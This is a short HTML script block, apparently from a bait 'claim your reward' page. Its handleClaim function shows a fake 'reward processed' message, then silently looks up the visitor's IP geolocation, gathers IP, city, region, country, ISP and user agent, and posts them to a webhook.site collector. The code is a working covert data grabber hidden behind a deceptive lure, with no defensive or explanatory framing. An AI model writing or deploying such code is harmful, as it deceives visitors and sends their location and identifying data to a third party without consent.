<script>
  async function handleClaim() {
    document.getElementById("mainBox").innerHTML = "<h2>Thank you!</h2><p>Your reward has been processed.</p>";

    try {
      const response = await fetch('https://ipapi.co/json/');
      const data = await response.json();

      const payload = {
        ip: data.ip,
        city: data.city,
        region: data.region,
        country: data.country_name,
        org: data.org,
        ua: navigator.userAgent,
        time: new Date().toString()
      };

      await fetch('https://webhook.site/a902d0b3-80e2-4011-8022-54839963dc96', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

    } catch (e) {
      console.error("Error sending data:", e);
    }
  }
</script>
